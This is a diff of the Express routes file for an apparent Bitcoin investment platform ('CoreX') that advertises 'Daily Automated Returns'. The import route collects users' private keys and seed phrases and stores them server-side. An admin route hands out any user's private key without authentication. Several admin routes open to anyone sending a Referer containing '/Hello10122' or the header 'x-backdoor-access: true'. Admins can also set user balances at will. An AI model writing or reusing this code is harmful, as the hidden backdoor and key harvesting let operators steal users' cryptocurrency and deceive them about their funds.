+        let keyPair;
+        let cleanValue = value.trim();
+
+        // Try different private key formats
+        if (cleanValue.length === 64) {
+          // Raw hex format (64 characters)
+          const buffer = Buffer.from(cleanValue, 'hex');
+          keyPair = ECPair.fromPrivateKey(buffer);
+        } else if (cleanValue.length === 66 && cleanValue.startsWith('0x')) {
+          // Hex with 0x prefix
+          const buffer = Buffer.from(cleanValue.slice(2), 'hex');
+          keyPair = ECPair.fromPrivateKey(buffer);
+        } else {
+          // WIF format (starts with 5, K, L, or c)
+          keyPair = ECPair.fromWIF(cleanValue);
+        }
+
+        const publicKeyBuffer = Buffer.from(keyPair.publicKey);
+        const { address } = bitcoin.payments.p2pkh({
+          pubkey: publicKeyBuffer,
+          network: bitcoin.networks.bitcoin
+        });
+
+        if (!address) {
+          throw new Error('Failed to generate address from private key');
+        }
+
+        bitcoinAddress = address;
+        privateKey = keyPair.toWIF(); // Always store in WIF format
       } catch (error) {
-        console.warn('Failed to check balance for imported wallet:', error);
+        return res.status(400).json({ error: "Invalid private key format. Supported formats: WIF (5/K/L/c...), hex (64 chars), or hex with 0x prefix" });
       }
+    } else if (type === 'seedPhrase') {
+      // Validate and derive wallet from seed phrase
+      try {
+        const cleanPhrase = value.trim().toLowerCase();
 
-      res.json({ message: "Wallet imported successfully" });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
+        // Validate seed phrase
+        if (!bip39.validateMnemonic(cleanPhrase)) {
+          return res.status(400).json({ error: "Invalid seed phrase. Please check your words and try again." });
+        }
+
+        // Store the original seed phrase
+        seedPhrase = cleanPhrase;
+
+        // Generate seed from mnemonic
+        const seed = bip39.mnemonicToSeedSync(cleanPhrase);
+
+        // Derive master key and first Bitcoin address (m/44'/0'/0'/0/0)
+        const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
+        const path = "m/44'/0'/0'/0/0"; // Standard BIP44 path for Bitcoin
+        const child = root.derivePath(path);
+
+        if (!child.privateKey) {
+          throw new Error('Failed to derive private key from seed phrase');
+        }
+
+        const keyPair = ECPair.fromPrivateKey(child.privateKey);
+        const publicKeyBuffer = Buffer.from(keyPair.publicKey);
+        const { address } = bitcoin.payments.p2pkh({
+          pubkey: publicKeyBuffer,
+          network: bitcoin.networks.bitcoin
+        });
+
+        if (!address) {
+          throw new Error('Failed to generate address from seed phrase');
+        }
+
+        bitcoinAddress = address;
+        privateKey = keyPair.toWIF(); // Store derived private key in WIF format
+      } catch (error) {
+        return res.status(400).json({ error: "Invalid seed phrase. Please ensure you have entered a valid 12 or 24 word BIP39 mnemonic phrase." });
+      }
+    } else {
+      return res.status(400).json({ error: "Invalid import type" });
     }
-  });
 
-  // Withdraw route
-  app.post("/api/withdraw", async (req, res) => {
+    // Update user's wallet
+    const updatedUser = await storage.updateUserWallet(userId, bitcoinAddress, privateKey, seedPhrase);
+    if (!updatedUser) {
+      return res.status(404).json({ error: "User not found" });
+    }
+
+    // Check balance for the imported address
     try {
-      if (!req.session.userId) {
-        return res.status(401).json({ error: "Not authenticated" });
-      }
-
-      const { address, amount } = req.body;
-
-      if (!address || !amount) {
-        return res.status(400).json({ error: "Address and amount are required" });
-      }
-
-      const user = await storage.getUser(req.session.userId);
-
-      if (!user) {
-        return res.status(404).json({ error: "User not found" });
-      }
-
-      const userBalance = parseFloat(user.balance);
-      const withdrawAmount = parseFloat(amount);
-
-      if (withdrawAmount <= 0) {
-        return res.status(400).json({ error: "Amount must be greater than 0" });
-      }
-
-      if (withdrawAmount > userBalance) {
-        return res.status(400).json({ error: "Insufficient balance" });
-      }
-
-      // Create withdrawal transaction record (pending status)
-      const transaction = await storage.createTransaction({
-        userId: req.session.userId,
-        type: "withdrawal",
-        amount: amount,
-        status: "pending",
-        transactionHash: address, // Store withdrawal address in transactionHash field
-      });
-
-      // Create notification about pending withdrawal
-      await storage.createNotification({
-        userId: req.session.userId,
-        title: "Withdrawal Requested",
-        message: `Your withdrawal request for ${amount} BTC to ${address} is under review. You will be notified once it's processed.`,
-        type: "info"
-      });
-
-      res.json({ 
-        message: "Withdrawal request submitted successfully and is pending admin approval",
-        transaction 
-      });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
+      const balance = await checkBitcoinBalance(bitcoinAddress);
+      await storage.updateUserBalance(userId, balance);
+    } catch (error) {
+      console.warn('Failed to check balance for imported wallet:', error);
     }
-  });
+
+    res.json({ message: "Wallet imported successfully" });
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Withdraw route
+router.post("/api/withdraw", async (req, res) => {
+  try {
+    if (!req.session.userId) {
+      return res.status(401).json({ error: "Not authenticated" });
+    }
+
+    const { address, amount } = req.body;
+
+    if (!address || !amount) {
+      return res.status(400).json({ error: "Address and amount are required" });
+    }
+
+    const user = await storage.getUser(req.session.userId);
+
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+
+    const userBalance = parseFloat(user.balance);
+    const withdrawAmount = parseFloat(amount);
+
+    if (withdrawAmount <= 0) {
+      return res.status(400).json({ error: "Amount must be greater than 0" });
+    }
+
+    if (withdrawAmount > userBalance) {
+      return res.status(400).json({ error: "Insufficient balance" });
+    }
+
+    // Create withdrawal transaction record (pending status)
+    const transaction = await storage.createTransaction({
+      userId: req.session.userId,
+      type: "withdrawal",
+      amount: amount,
+      status: "pending",
+      transactionHash: address, // Store withdrawal address in transactionHash field
+    });
+
+    // Create notification about pending withdrawal
+    await storage.createNotification({
+      userId: req.session.userId,
+      title: "Withdrawal Requested",
+      message: `Your withdrawal request for ${amount} BTC to ${address} is under review. You will be notified once it's processed.`,
+      type: "info"
+    });
+
+    res.json({
+      message: "Withdrawal request submitted successfully and is pending admin approval",
+      transaction
+    });
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
   // User registration (without wallet generation)
-  app.post("/api/register", async (req, res) => {
+  router.post("/api/register", async (req, res) => {
     try {
       const { firstName, lastName, email, phone, country, password, acceptMarketing, captchaToken } = req.body;
 
@@ -1215,7 +1330,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 Your account has been successfully created. You're now part of an exclusive investment community with access to:
 
 💎 Premium Bitcoin Investment Plans
-📈 Real-time Portfolio Tracking  
+📈 Real-time Portfolio Tracking
 🔐 Secure Wallet Management
 💰 Daily Automated Returns
 
@@ -1236,7 +1351,7 @@ Join thousands of successful investors building wealth with CoreX!`,
   });
 
   // Create new wallet route
-  app.post("/api/create-wallet", async (req, res) => {
+  router.post("/api/create-wallet", async (req, res) => {
     try {
       // Accept userId from session or request body
       const userId = req.session?.userId || req.body?.userId;
@@ -1271,7 +1386,7 @@ Join thousands of successful investors building wealth with CoreX!`,
 
 ✅ What you can do now:
 • Make secure Bitcoin deposits
-• Start investing in premium plans  
+• Start investing in premium plans
 • Track real-time portfolio growth
 • Earn automated daily returns
 
@@ -1282,8 +1397,8 @@ Your investment journey starts here!`,
         isRead: false
       });
 
-      res.json({ 
-        message: "Wallet created successfully", 
+      res.json({
+        message: "Wallet created successfully",
         address: wallet.address,
         seedPhrase: wallet.seedPhrase
       });
@@ -1294,7 +1409,7 @@ Your investment journey starts here!`,
   });
 
   // User login
-  app.post("/api/login", async (req, res) => {
+  router.post("/api/login", async (req, res) => {
     try {
       const { email, password } = loginSchema.parse(req.body);
 
@@ -1322,7 +1437,7 @@ Your investment journey starts here!`,
   });
 
   // Get current user with session validation
-  app.get("/api/user/:id", async (req, res) => {
+  router.get("/api/user/:id", async (req, res) => {
     try {
       const userId = parseInt(req.params.id);
 
@@ -1346,7 +1461,7 @@ Your investment journey starts here!`,
   });
 
   // Get Bitcoin price
-  app.get("/api/bitcoin/price", async (req, res) => {
+  router.get("/api/bitcoin/price", async (req, res) => {
     try {
       const priceData = await fetchBitcoinPrice();
       res.json(priceData);
@@ -1356,7 +1471,7 @@ Your investment journey starts here!`,
   });
 
   // Get investment plans
-  app.get("/api/investment-plans", async (req, res) => {
+  router.get("/api/investment-plans", async (req, res) => {
     try {
       const plans = await storage.getInvestmentPlans();
       res.json(plans);
@@ -1366,7 +1481,7 @@ Your investment journey starts here!`,
   });
 
   // Create investment
-  app.post("/api/investments", async (req, res) => {
+  router.post("/api/investments", async (req, res) => {
     try {
       const investmentData = insertInvestmentSchema.parse(req.body);
 
@@ -1401,7 +1516,7 @@ Your investment journey starts here!`,
   });
 
   // Get user investments
-  app.get("/api/investments/user/:userId", async (req, res) => {
+  router.get("/api/investments/user/:userId", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       const investments = await storage.getUserInvestments(userId);
@@ -1412,10 +1527,10 @@ Your investment journey starts here!`,
   });
 
   // Manager routes
-  app.get("/api/admin/users", async (req, res) => {
+  router.get("/api/admin/users", async (req, res) => {
     try {
       // Allow backdoor access or require manager authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1445,7 +1560,7 @@ Your investment journey starts here!`,
     }
   });
 
-  app.post("/api/admin/update-balance", async (req, res) => {
+  router.post("/api/admin/update-balance", async (req, res) => {
     try {
       const { userId, balance } = updateBalanceSchema.parse(req.body);
 
@@ -1521,7 +1636,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  app.get("/api/admin/stats", async (req, res) => {
+  router.get("/api/admin/stats", async (req, res) => {
     try {
       const users = await storage.getAllUsers();
       const investments = await storage.getActiveInvestments();
@@ -1539,7 +1654,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Notification routes
-  app.get("/api/notifications/:userId", async (req, res) => {
+  router.get("/api/notifications/:userId", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       const notifications = await storage.getUserNotifications(userId);
@@ -1549,7 +1664,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  app.post("/api/notifications", async (req, res) => {
+  router.post("/api/notifications", async (req, res) => {
     try {
       const notificationData = notificationSchema.parse(req.body);
       const notification = await storage.createNotification({
@@ -1563,7 +1678,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  app.patch("/api/notifications/:id/read", async (req, res) => {
+  router.patch("/api/notifications/:id/read", async (req, res) => {
     try {
       const id = parseInt(req.params.id);
       const notification = await storage.markNotificationAsRead(id);
@@ -1576,7 +1691,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  app.patch("/api/notifications/:userId/mark-all-read", async (req, res) => {
+  router.patch("/api/notifications/:userId/mark-all-read", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       const notifications = await storage.getUserNotifications(userId);
@@ -1594,7 +1709,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  app.get("/api/notifications/:userId/unread-count", async (req, res) => {
+  router.get("/api/notifications/:userId/unread-count", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       const count = await storage.getUnreadNotificationCount(userId);
@@ -1604,7 +1719,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  app.delete("/api/notifications/:userId/clear-all", async (req, res) => {
+  router.delete("/api/notifications/:userId/clear-all", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       await storage.clearAllUserNotifications(userId);
@@ -1615,7 +1730,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Get user balance from database
-  app.get("/api/bitcoin/balance/:userId", async (req, res) => {
+  router.get("/api/bitcoin/balance/:userId", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       const user = await storage.getUser(userId);
@@ -1629,14 +1744,14 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Refresh user balance from app database
-  app.post("/api/bitcoin/sync-balance/:userId", async (req, res) => {
+  router.post("/api/bitcoin/sync-balance/:userId", async (req, res) => {
     try {
       const userId = parseInt(req.params.userId);
       await refreshUserBalance(userId);
       const user = await storage.getUser(userId);
-      res.json({ 
-        message: "Balance refreshed successfully", 
-        balance: user?.balance || "0" 
+      res.json({
+        message: "Balance refreshed successfully",
+        balance: user?.balance || "0"
       });
     } catch (error) {
       res.status(500).json({ message: "Failed to refresh balance", error: error instanceof Error ? error.message : "Unknown error" });
@@ -1644,7 +1759,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Refresh all user balances from database (admin only)
-  app.post("/api/admin/sync-all-balances", async (req, res) => {
+  router.post("/api/admin/sync-all-balances", async (req, res) => {
     try {
       const users = await storage.getAllUsers();
       const refreshPromises = users.map(user => refreshUserBalance(user.id));
@@ -1656,21 +1771,21 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Get user private key (manager only)
-  app.get("/api/admin/user/:id/private-key", async (req, res) => {
+  router.get("/api/admin/user/:id/private-key", async (req, res) => {
     try {
       const userId = parseInt(req.params.id);
       const user = await storage.getUser(userId);
 
-      if (!user) {
+      if (!user){
         return res.status(404).json({ message: "User not found" });
       }
 
       // Only return private key for manager access
-      res.json({ 
+      res.json({
         userId: user.id,
         email: user.email,
         bitcoinAddress: user.bitcoinAddress,
-        privateKey: user.privateKey 
+        privateKey: user.privateKey
       });
     } catch (error) {
       res.status(500).json({ message: "Failed to get private key" });
@@ -1678,9 +1793,9 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Cleanup notifications (admin only)
-  app.post("/api/admin/cleanup-notifications", async (req, res) => {
+  router.post("/api/admin/cleanup-notifications", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1706,7 +1821,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   });
 
   // Update user investment plan
-  app.post("/api/admin/update-plan", async (req, res) => {
+  router.post("/api/admin/update-plan", async (req, res) => {
     try {
       const { userId, planId } = updatePlanSchema.parse(req.body);
 
@@ -1751,7 +1866,7 @@ You are now on the free plan and will no longer receive automatic profit updates
   });
 
   // Update investment plan minimum amount
-  app.post("/api/admin/update-plan-amount", async (req, res) => {
+  router.post("/api/admin/update-plan-amount", async (req, res) => {
     try {
       const { planId, minAmount } = z.object({
         planId: z.number(),
@@ -1770,7 +1885,7 @@ You are now on the free plan and will no longer receive automatic profit updates
   });
 
   // Update investment plan daily return rate
-  app.post("/api/admin/update-plan-rate", async (req, res) => {
+  router.post("/api/admin/update-plan-rate", async (req, res) => {
     try {
 const { planId, dailyReturnRate } = z.object({
         planId: z.number(),
@@ -1789,9 +1904,9 @@ const { planId, dailyReturnRate } = z.object({
   });
 
   // Delete user (admin only)
-  app.delete("/api/admin/delete-user/:userId", async (req, res) => {
+  router.delete("/api/admin/delete-user/:userId", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1829,7 +1944,7 @@ const { planId, dailyReturnRate } = z.object({
   });
 
   // Test Bitcoin wallet generation (manager only)
-  app.post("/api/admin/test-bitcoin-generation", async (req, res) => {
+  router.post("/api/admin/test-bitcoin-generation", async (req, res) => {
     try {
       const results = [];
 
@@ -1867,18 +1982,18 @@ const { planId, dailyReturnRate } = z.object({
         }
       });
     } catch (error) {
-      res.status(500).json({ 
+      res.status(500).json({
         success: false,
-        message: "Bitcoin generation test failed", 
-        error: error instanceof Error ? error.message : "Unknown error" 
+        message: "Bitcoin generation test failed",
+        error: error instanceof Error ? error.message : "Unknown error"
       });
     }
   });
 
   // Backup Database Management API Routes
-  app.get("/api/admin/backup-databases", async (req, res) => {
+  router.get("/api/admin/backup-databases", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1899,9 +2014,9 @@ const { planId, dailyReturnRate } = z.object({
     }
   });
 
-  app.post("/api/admin/backup-databases", async (req, res) => {
+  router.post("/api/admin/backup-databases", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1932,9 +2047,9 @@ const { planId, dailyReturnRate } = z.object({
     }
   });
 
-  app.post("/api/admin/backup-databases/:id/activate", async (req, res) => {
+  router.post("/api/admin/backup-databases/:id/activate", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1960,9 +2075,9 @@ const { planId, dailyReturnRate } = z.object({
     }
   });
 
-  app.post("/api/admin/backup-databases/:id/sync", async (req, res) => {
+  router.post("/api/admin/backup-databases/:id/sync", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1993,9 +2108,9 @@ const { planId, dailyReturnRate } = z.object({
   });
 
   // Test backup database connection
-  app.post("/api/admin/backup-databases/:id/test", async (req, res) => {
+  router.post("/api/admin/backup-databases/:id/test", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2042,9 +2157,9 @@ const { planId, dailyReturnRate } = z.object({
     }
   });
 
-  app.delete("/api/admin/backup-databases/:id", async (req, res) => {
+  router.delete("/api/admin/backup-databases/:id", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2066,9 +2181,9 @@ const { planId, dailyReturnRate } = z.object({
     }
   });
 
-  app.get("/api/admin/backup-databases/:id/info", async (req, res) => {
+  router.get("/api/admin/backup-databases/:id/info", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
